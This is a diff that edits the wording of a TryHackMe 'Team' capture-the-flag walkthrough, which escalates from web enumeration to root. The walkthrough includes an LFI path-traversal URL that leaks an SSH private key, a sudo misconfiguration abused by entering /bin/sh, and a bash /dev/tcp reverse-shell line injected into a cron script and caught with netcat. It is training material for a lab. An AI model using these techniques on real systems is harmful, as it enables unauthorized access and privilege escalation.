@@ -10,20 +10,20 @@ This room simulates a small internal "team site" that leaks credentials
 through a forgotten backup file, then chains that access into SSH, sudo
 misuse, and a writable cron script to escalate to root. It's a good example
 of how a handful of small, individually "minor" misconfigurations, in this
-case, a forgotten `.old` file can add up to a major impact, in this case
-full root access. Every step in this chain would have left a distinct trail
-in logs, which I've noted throughout.
+case a forgotten `.old` file, can add up to a major impact: full root
+access. Every step in this chain would have left a distinct trail in logs,
+which I've noted throughout.
 
 ## Tools Used
 
-- `dirsearch` — initial directory enumeration
-- `ffuf` — targeted fuzzing on the `/scripts/` path
-- `ftp` — retrieving files from an exposed FTP share
-- Browser LFI (`script.php?page=`) — reading local files off the dev vhost
-- `ssh` — authenticating with a recovered private key
-- `python3 pty.spawn` — shell stabilization
-- `nc` (netcat) — catching a reverse shell
-- `nano` — editing the writable cron script
+- `dirsearch` for initial directory enumeration
+- `ffuf` for targeted fuzzing on the `/scripts/` path
+- `ftp` for retrieving files from an exposed FTP share
+- Browser LFI (`script.php?page=`) for reading local files off the dev vhost
+- `ssh` for authenticating with a recovered private key
+- `python3 pty.spawn` for shell stabilization
+- `nc` (netcat) for catching a reverse shell
+- `nano` for editing the writable cron script
 
 ## Objective
 
@@ -43,7 +43,7 @@ connect. Then, get the IP of the lab machine and add it to your
 
 ## Process
 
-### 1. Initial recon
+### 1. Initial Recon
 
 We start by looking for directories inside `http://team.thm/`:
 
@@ -60,9 +60,9 @@ keeping in mind for later.
 
 ![robots.txt containing the username "dale"](./screenshots/5.png)
 
-### 2. Fuzzing the scripts directory
+### 2. Fuzzing the Scripts Directory
 
-Of the directories found, `/scripts/` is the most interesting 
+Of the directories found, `/scripts/` is the most interesting.
 `/images/` and `/assets/` are unlikely to hold anything actionable. Fuzzing
 it directly:
 
@@ -95,10 +95,10 @@ team.thm
 ![Logging into FTP](./screenshots/9.png)
 
 One thing to note: the directory you're running these commands from
-matters — if `get` doesn't work on a file you're trying to pull, try moving
+matters. If `get` doesn't work on a file you're trying to pull, try moving
 up a directory (`cd ..`) before reconnecting.
 
-### 4. Retrieving the file
+### 4. Retrieving the File
 
 Inside the FTP session, navigating with `ls` and `cd` eventually surfaces
 `New_site.txt`:
@@ -123,94 +123,101 @@ setup:
   <em>The IP differs from the setup screenshot since this one was taken on a separate day.</em>
 </p>
 
-### dev subdomain
+### 5. The Dev Subdomain
 
-Inside dev.team.thm, we find a placeholder link for a teamshare, and the url will be http://dev.team.thm/script.php?page=teamshare.php
+Inside `dev.team.thm`, there's a placeholder link for a "teamshare", pointing
+to `http://dev.team.thm/script.php?page=teamshare.php`.
 
-from the script.php?page=, we can find vital directories using another directory search after the '=', this time use a wordlist that is more relevant to LFI.
+The `page` parameter is worth investigating on its own. Fuzzing after the
+`=` with a wordlist geared toward LFI turns up `../../../etc/ssh/sshd_config`,
+reachable at: http://dev.team.thm/script.php?page=../../../etc/ssh/sshd_config
 
-doing so will let you find ../../../etc/ssh/sshd_config, to be more specific, http://dev.team.thm/script.php?page=../../../etc/ssh/sshd_config. This will have an ssh key.
+This file contains an SSH key.
 
-![Contents of script.txt](./screenshots/13_.png)
+![sshd_config leaking an SSH private key via LFI](./screenshots/13_.png)
 
-### SSH key
+### 6. Recovering the SSH Key
 
-make a file with the key starting from the BEGIN OPENSSH PRIVATE KEY line down to END OPENSSH PRIVATE KEY line, and remove all the '#'
+Create a local file with the key contents, starting from
+`-----BEGIN OPENSSH PRIVATE KEY-----` down to
+`-----END OPENSSH PRIVATE KEY-----`, and strip out the leading `#` on each
+line. The result should look like this:
 
-the file's contents should look like this 
+![Cleaned-up SSH private key file](./screenshots/14_.png)
 
-![Contents of script.txt](./screenshots/14_.png)
+### 7. SSH Access and First Flag
 
-### SSH connection, First Flag
-
-now, while keeping in mind of which directory you're running the command the following command
+Keeping in mind which directory you're running from, connect with:
 
 ```bash
-ssh -i [SSH File name] dale@team.thm
+ssh -i [SSH file name] dale@team.thm
 ```
 
-you'll get access to dale's files, which when you navigate, you'll find your first flag on user.txt.
+This gives access to dale's files. Navigating them turns up the first flag
+in `user.txt`.
 
-![Contents of script.txt](./screenshots/16.png)
+![First flag in user.txt](./screenshots/16.png)
 
-### privilege escalation
+### 8. Privilege Escalation
 
-after scouring the files for a bit, you might find the user gyles on /home/gyles/, which contains one file, named admin_checks.
-
-you can also find the file using the command
+Scouring the filesystem turns up a user, gyles, at `/home/gyles/`,
+containing a single file named `admin_checks`. The same thing can be found
+with:
 
 ```bash
 sudo -l
 ```
 
-now, if we print admin_checks, we see the following
+Printing `admin_checks` shows the following:
 
-![Contents of script.txt](./screenshots/17.png)
+![Contents of admin_checks](./screenshots/17.png)
 
-the process looks like a sudo -u process, which is what we'll be running now
+The script looks like it's meant to be run with `sudo -u`, so:
 
 ```bash
 sudo -u gyles /home/gyles/admin_checks
 ```
 
-here, we're going to need credentials and a date, however, often times, systems have misconfigured sudo rights, which allows us to get the credentials right off of /bin/sh without even knowing them, which is  why we can simply type /bin/sh on each of the questions
+It prompts for credentials and a date. Systems like this are often
+misconfigured badly enough that supplying `/bin/sh` at any of the prompts
+spawns a shell instead of requiring the actual credentials:
 
-![Contents of script.txt](./screenshots/18.png)
+![Spawning a shell via admin_checks misconfiguration](./screenshots/18.png)
 
-### setting the reverse shell
+### 9. Setting Up the Reverse Shell
 
-we'll now spawn an interactive shell while on gyles, run the following command
+Spawn an interactive shell while on gyles:
 
 ```bash
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
-![Contents of script.txt](./screenshots/19.png)
+![Spawning an interactive shell](./screenshots/19.png)
 
-now go to /home/gyles and run ls -la, we will find a .bash_history file
+Navigating to `/home/gyles` and running `ls -la` reveals a `.bash_history`
+file. Reading through it carefully turns up a `nano` command targeting
+`/usr/local/bin/main_backup.sh`, which ends up being the path to root.
 
-read through the file carefully, you'll eventually find a nano command on /usr/local/bin/main_backup.sh
-
-this can help us get root privileges 
-
-printing the file, we notice that it is extremely vulnerable, we will be replacing the line "cp -r /var/www/team.thm/* /var/backups/www/team.thm/ " pentest monkey bash reverse shell to get a reverse shell
-
-the format is the following:
+Printing the file shows it's badly exposed. Replacing the line
+`cp -r /var/www/team.thm/* /var/backups/www/team.thm/` with a Pentest Monkey
+bash reverse shell gets us a shell as whoever runs the script:
 
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
-replace the ip with the ip that tryhackme gave you when you connected to the tryhackme VPN
+Replace the IP with the one TryHackMe assigned when connecting to the VPN.
 
-![Contents of script.txt](./screenshots/20.png)
+![Replacing main_backup.sh with a reverse shell payload](./screenshots/20.png)
 
-### Accessing reverse shell and root, Flag 2
+### 10. Catching the Shell and Root, Flag Two
 
-After changing main_backup.sh, open a separate terminal and run the following command:
+After editing `main_backup.sh`, open a separate terminal and listen:
 
 ```bash
 nc -lvnp 8080
 ```
 
-give it some time, you'll eventually connect to the reverse shell. Navigate using ls and congratulations! you've found root.txt, AKA the second flag. :)
+Give it some time. Once the scheduled job runs the script, the shell
+connects back. Navigate with `ls` and you'll find `root.txt`, the second
+flag. :)
